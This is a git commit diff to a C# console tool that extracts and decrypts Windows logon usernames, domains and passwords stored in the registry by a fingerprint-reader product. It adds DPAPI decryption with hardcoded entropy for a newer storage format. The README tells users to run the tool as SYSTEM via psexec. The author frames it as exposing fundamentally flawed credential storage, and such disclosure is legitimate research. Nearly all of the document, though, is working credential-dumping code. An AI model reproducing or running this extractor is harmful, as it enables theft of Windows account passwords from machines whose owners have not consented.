491873e9794cd09bcfc5458099d565fdf55af716
Brandon Wilson <brandonlw@gmail.com>
2012-10-12 13:42:49 -0400

    Added support for latest patch (requires running as NT AUTHORITY\SYSTEM first)

--- FingerprintEncryption/Startup.cs
+++ FingerprintEncryption/Startup.cs
@@ -1,13 +1,45 @@
 ﻿using Microsoft.Win32;
 using System;
 using System.Collections.Generic;
+using System.Linq;
+using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 
 namespace FingerprintEncryption
 {
+  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+  internal struct DATA_BLOB
+  {
+    public int cbData;
+    public IntPtr pbData;
+  }
+
+  [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+  internal struct CRYPTPROTECT_PROMPTSTRUCT
+  {
+    public int cbSize;
+    public int dwPromptFlags;
+    public IntPtr hwndApp;
+    public string szPrompt;
+  }
+
   class Startup
   {
+    [DllImport("crypt32.dll",
+                    SetLastError = true,
+                    CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+    private static extern bool CryptUnprotectData(ref DATA_BLOB pCipherText,
+                                ref string pszDescription,
+                                ref DATA_BLOB pEntropy,
+                                    IntPtr pReserved,
+                                ref CRYPTPROTECT_PROMPTSTRUCT pPrompt,
+                                    int dwFlags,
+                                ref DATA_BLOB pPlainText);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    static extern IntPtr LocalFree(IntPtr hMem);
+
     private static bool _verbose = false;
 
     //NOTE: This only seems to decrypt "ExData", not the other one, which is okay I guess since it has more data.
@@ -15,53 +47,73 @@ namespace FingerprintEncryption
     //      It currently tries to decrypt any "ExData" values in either 32-bit or 64-bit registries
     //        and displays the Unicode strings within.
     //      I haven't figured out the format of the data yet -- not easy to traverse at first glance.
+    //The storage of this information is fundamentally flawed, and I don't really want to play this cat-and-mouse
+    //  game anymore, so this is probably the last update.
     //Forgive the awfulness that is this code file.
     static void Main(string[] args)
     {
-      //Display basic stuff
-      var asm = System.Reflection.Assembly.GetExecutingAssembly().GetName();
-      Console.WriteLine(asm.Name + " v" + asm.Version.ToString(3));
-      Console.WriteLine("This application attempts to extract your logon information");
-      Console.WriteLine(" from one or more encrypted registry keys.");
-
-      //Parse command line arguments
-      foreach (var arg in args)
+      try
       {
-        var a = arg.Trim(new char[] { '-', '/' });
-        if (a.Contains("v"))
-          _verbose = true;
-        else if (a.Contains("h"))
+        //Display basic stuff
+        var asm = System.Reflection.Assembly.GetExecutingAssembly().GetName();
+        Console.WriteLine(asm.Name + " v" + asm.Version.ToString(3));
+        Console.WriteLine("This application attempts to extract your logon information");
+        Console.WriteLine(" from one or more encrypted registry keys.");
+
+        //Parse command line arguments
+        foreach (var arg in args)
         {
-          //Display help
-          Console.WriteLine("Options:");
-          Console.WriteLine("-v\tVerbose mode; display all strings from registry key.");
-          Console.WriteLine("-h\tDisplay this help text.");
-          Console.WriteLine();
+          var a = arg.Trim(new char[] { '-', '/' });
+          if (a.Contains("v"))
+            _verbose = true;
+          else if (a.Contains("h"))
+          {
+            //Display help
+            Console.WriteLine("Options:");
+            Console.WriteLine("-v\tVerbose mode; display all strings from registry key.");
+            Console.WriteLine("-h\tDisplay this help text.");
+            Console.WriteLine();
 
-          return;
+            return;
+          }
         }
+
+        //Get busy...
+        Console.WriteLine();
+        Console.WriteLine("Working...");
+
+        //Check all the registry keys we know of...
+        int count = 0;
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\Passport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\LocalPassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\DevicePassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\VoidPassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\Passport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\LocalPassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\DevicePassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\3.0\VoidPassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\Passport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\LocalPassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\DevicePassport");
+        count += _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\VoidPassport");
+
+        //Display counts and get out
+        Console.WriteLine();
+        Console.WriteLine(String.Format("Done ({0} {1} found).", count, count == 1 ? "entry" : "entries"));
       }
-
-      //Get busy...
-      Console.WriteLine();
-      Console.WriteLine("Working...");
-
-      //Check all the registry keys we know of...
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\Passport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\LocalPassport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\DevicePassport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\2.0\VoidPassport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\Passport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\LocalPassport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\DevicePassport");
-      _ScanRegistryKey(@"Software\Virtual Token\Passport\4.0\VoidPassport");
-
-      Console.WriteLine();
-      Console.WriteLine("Done.");
+      catch (Exception ex)
+      {
+        Console.WriteLine("ERROR: " + (_verbose ? ex.ToString() : ex.Message));
+        Console.WriteLine();
+        Console.WriteLine("Try running as NT AUTHORITY\\SYSTEM first");
+        Console.WriteLine("  (AKA \"psexec.exe -s -i cmd.exe\") to see if it helps.");
+      }
     }
 
-    private static void _ScanRegistryKey(string subKey)
+    private static int _ScanRegistryKey(string subKey)
     {
+      int ret = 0;
+
       //Deal with 32-bit version
       var reg32 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32);
       var key32 = reg32.OpenSubKey(subKey);
@@ -74,7 +126,7 @@ namespace FingerprintEncryption
           foreach (var val in r.GetValueNames())
           {
             //Handle this key value
-            _HandleKeyValue(r.Name, val, (byte[])r.GetValue(val));
+            if (_HandleKeyValue(r.Name, val, (byte[])r.GetValue(val))) ret++;
           }
         }
       }
@@ -91,17 +143,24 @@ namespace FingerprintEncryption
           foreach (var val in r.GetValueNames())
           {
             //Handle this key value
-            _HandleKeyValue(r.Name, val, (byte[])r.GetValue(val));
+            if (_HandleKeyValue(r.Name, val, (byte[])r.GetValue(val))) ret++;
           }
         }
       }
+
+      return ret;
     }
 
-    private static void _HandleKeyValue(string key, string name, byte[] raw)
+    private static bool _HandleKeyValue(string key, string name, byte[] raw)
     {
+      bool ret = false;
+
       //HACK: Since this currently only supports ExData, only look for it...
       if (name == "ExData")
       {
+        //We'll consider this "found"
+        ret = true;
+
         //Display initial information
         Console.WriteLine(String.Format("Found {0}, name {1}:", key, name));
 
@@ -109,38 +168,66 @@ namespace FingerprintEncryption
         int header = _GetInt(raw, 0);
         int type = _GetInt(raw, 4);
         int bitLength = _GetInt(raw, 16);
-        var data = new byte[_GetInt(raw, 20)];
-        Array.Copy(raw, 24, data, 0, data.Length);
-        var iv = new byte[_GetInt(raw, 24 + data.Length)];
-        Array.Copy(raw, 24 + data.Length + 4, iv, 0, iv.Length);
+        byte[] encryptedBlock = null;
+        int dataOffset = 20;
+        if (type >= 0x05)
+        {
+          //Starting with type 0x05, we get a new DPAPI-encrypted seed to produce the passphrase
+          encryptedBlock = new byte[_GetInt(raw, dataOffset)];
+          Array.Copy(raw, dataOffset + 4, encryptedBlock, 0, encryptedBlock.Length);
+          dataOffset += 4 + encryptedBlock.Length + 2;
+        }
+        var data = new byte[_GetInt(raw, dataOffset)];
+        Array.Copy(raw, dataOffset + 4, data, 0, data.Length);
+        var iv = new byte[_GetInt(raw, dataOffset + 4 + data.Length)];
+        Array.Copy(raw, dataOffset + 4 + data.Length + 4, iv, 0, iv.Length);
+
         if (_verbose)
         {
           Console.WriteLine(String.Format("\tHeader: {0}", header.ToString("X4")));
           Console.WriteLine(String.Format("\tType: {0}", type.ToString("X4")));
           Console.WriteLine(String.Format("\tBit length: {0}", bitLength.ToString()));
+          if (type >= 0x05) Console.WriteLine(String.Format("\tSeed length: {0}", encryptedBlock.Length.ToString()));
           Console.WriteLine(String.Format("\tIV length: {0}", iv.Length.ToString("X4")));
           Console.WriteLine(String.Format("\tDecrypting {0} data bytes...", data.Length.ToString("X4")));
         }
 
-        var output = _DecryptData(data, iv, bitLength, null);
+        //Get the passphrase (for types 0x04 and below, it's NULL (*sigh*...), and it's a little more involved for 0x05+
+        byte[] passphrase = null;
+        if (type >= 0x05)
+        {
+          //Decrypt the DPAPI-encrypted seed
+          var decryptedBlock = _DecryptBlock(encryptedBlock);
+
+          //SHA1 hash the old passphrase + this seed to produce the new passphrase
+          var sha1 = new System.Security.Cryptography.SHA1CryptoServiceProvider();
+          passphrase = sha1.ComputeHash(_Merge(passphrase, decryptedBlock));
+        }
+
+        //Get the main data/strings
+        var output = _DecryptData(data, iv, bitLength, passphrase);
         if (output[8] == 'P' && output[9] == 'S' && output[10] == '1')
         {
           if (_verbose) Console.WriteLine("\tDecryption successful!");
 
-          //HACK: Really dumb parsing of the string data since I can't seem to figure it out yet...
-          //Look for B0 04 00 00, and if found, look at the previous int for the size and rip it out
+          //HACK: Really dumb parsing of the string data since
+          //  I can't seem to figure it out yet...
+          //Look for B0 04 00 00, and if found, look at the previous int
+          //  for the size and rip it out
           int i = 11;
           if (_verbose) Console.WriteLine("\tStrings:");
           var lastString = String.Empty;
           while (i < output.Length)
           {
-            if (output[i] == 0xB0 && output[i + 1] == 0x04 && output[i + 2] == 0x00 && output[i + 3] == 0x00)
+            if (output[i] == 0xB0 && output[i + 1] == 0x04 &&
+              output[i + 2] == 0x00 && output[i + 3] == 0x00)
             {
               //Get the size
               int size = _GetInt(output, i - 4);
               
               //Rip out the data
-              var str = System.Text.UnicodeEncoding.Unicode.GetString(output, i + 4, size).TrimEnd('\0');
+              var str = UnicodeEncoding.Unicode.GetString(output,
+                i + 4, size).TrimEnd('\0');
 
               //Display it
               if (_verbose)
@@ -158,13 +245,15 @@ namespace FingerprintEncryption
                     }
                   case "0x12":
                     {
-                      if (str.ToLower() != "p1" && str.ToLower() != "0x11" && str.ToLower() != "0x12")
+                      if (str.ToLower() != "p1" && str.ToLower() != "0x11" &&
+                        str.ToLower() != "0x12")
                         Console.WriteLine("\t\tDomain:\t" + str);
                       break;
                     }
                   case "p1":
                     {
-                      Console.WriteLine("\t\tPassword:\t" + str);
+                      if (type != 0x05)
+                        Console.WriteLine("\t\tPassword:\t" + str);
                       break;
                     }
                   default:
@@ -181,17 +270,108 @@ namespace FingerprintEncryption
 
             i++;
           }
+
+          //For types 0x05 and above, the password is encrypted separately -- get it
+          if (!_verbose && type >= 0x05)
+          {
+            //HACK: Not exactly sure how to parse the above data, so just look for a block with a specific size
+            var index = _FindBytes(output, new byte[] { 0xF6, 0x00, 0x00, 0x00 });
+            var passwordBlock = new byte[_GetInt(output, index.Value)];
+            Array.Copy(output, index.Value + 4, passwordBlock, 0, passwordBlock.Length);
+            var decryptedPassword = _DecryptBlock(passwordBlock);
+
+            Console.WriteLine("\t\tPassword:\t" +
+              UnicodeEncoding.Unicode.GetString(decryptedPassword).TrimEnd('\0'));
+          }
         }
         else
         {
           if (_verbose) Console.WriteLine("\tDecryption error!");
         }
       }
+
+      return ret;
     }
 
     private static int _GetInt(byte[] raw, int offset)
     {
-      return (raw[offset] | (raw[offset + 1] << 8) | (raw[offset + 2] << 16) | (raw[offset + 3] << 24));
+      return (raw[offset] | (raw[offset + 1] << 8) |
+        (raw[offset + 2] << 16) | (raw[offset + 3] << 24));
+    }
+
+    private static int? _FindBytes(byte[] haystack, byte[] needle)
+    {
+      int? ret = null;
+
+      for (int i = 0; i < haystack.Length; i++)
+      {
+        bool found = true;
+
+        for (int j = 0; j < needle.Length; j++)
+        {
+          if (haystack[i + j] != needle[j])
+          {
+            found = false;
+            break;
+          }
+        }
+
+        if (found)
+        {
+          ret = i;
+          break;
+        }
+      }
+
+      return ret;
+    }
+
+    private static byte[] _DecryptBlock(byte[] encryptedBlock)
+    {
+      const int ENTROPY_LENGTH = 0x86;
+      const string ENTROPY_DATA = "Software"; //Really? *Really*?
+      var entropyData = new byte[ENTROPY_LENGTH];
+
+      //Create the prompt structure for CryptUnprotectData
+      CRYPTPROTECT_PROMPTSTRUCT prompt = new CRYPTPROTECT_PROMPTSTRUCT();
+      prompt.cbSize = Marshal.SizeOf(typeof(CRYPTPROTECT_PROMPTSTRUCT));
+      prompt.dwPromptFlags = 0;
+      prompt.hwndApp = IntPtr.Zero;
+      prompt.szPrompt = null;
+
+      //Build the entropy structure
+      DATA_BLOB entropy = new DATA_BLOB();
+      entropy.cbData = entropyData.Length;
+      Array.Copy(Encoding.ASCII.GetBytes(ENTROPY_DATA), 0, entropyData, 0, ENTROPY_DATA.Length);
+      IntPtr ptrEntropy = Marshal.AllocHGlobal(entropyData.Length);
+      entropyData[0x2B] = 0x01; //anti-debugging magic
+      entropyData[0x43] = 0x05;
+      Marshal.Copy(entropyData, 0, ptrEntropy, entropyData.Length);
+      entropy.pbData = ptrEntropy;
+
+      //Build the cipher text structure
+      DATA_BLOB cipherText = new DATA_BLOB();
+      IntPtr ptrCipher = Marshal.AllocHGlobal(encryptedBlock.Length);
+      Marshal.Copy(encryptedBlock, 0, ptrCipher, encryptedBlock.Length);
+      cipherText.cbData = encryptedBlock.Length;
+      cipherText.pbData = ptrCipher;
+
+      //Do the decryption
+      DATA_BLOB plainText = new DATA_BLOB();
+      var description = String.Empty; //Not using a description
+      if (!CryptUnprotectData(ref cipherText, ref description, ref entropy, IntPtr.Zero, ref prompt, 0, ref plainText))
+        throw new InvalidOperationException("DPAPI decryption error: " + Marshal.GetLastWin32Error().ToString("X8"));
+
+      //Get the decrypted data into our object
+      var decrypted = new byte[plainText.cbData];
+      Marshal.Copy(plainText.pbData, decrypted, 0, plainText.cbData);
+
+      //Free everything up
+      LocalFree(plainText.pbData);
+      Marshal.FreeHGlobal(ptrEntropy);
+      Marshal.FreeHGlobal(ptrCipher);
+
+      return decrypted;
     }
 
     private static byte[] _DecryptData(byte[] data, byte[] IV, int bitLength, byte[] passphrase)
@@ -241,7 +421,7 @@ namespace FingerprintEncryption
       return key;
     }
 
-    //Just merges two arrays. You can pass NULL for either (or both?).
+    //Just merges two arrays. You can pass NULL for either (or both?!).
     private static byte[] _Merge(byte[] first, byte[] second)
     {
       var ret = new byte[(first != null ? first.Length : 0) + (second != null ? second.Length : 0)];
--- README.md
+++ README.md
@@ -7,4 +7,10 @@ This is a little .NET 4.0 C# console application that demonstrates how to decryp
 
 Run it with "-h" to see how to use it. By default it spits out all the Windows usernames, passwords, and domains it can find, but you can specify everything with verbose mode (-v).
 
+Depending on the version of Protector Suite you have installed, you may need to run this tool as NT AUTHORITY\SYSTEM. You can do this by downloading and using psexec.exe (Google for it) and bringing up a command prompt via:
+
+psexec.exe -s -i cmd.exe
+
+You can then navigate to the directory for this tool and run it.
+
 If this tool doesn't work for you and you want it to, feel free to let me know at brandonlw@gmail.com along with a sample of your data so support can be added.
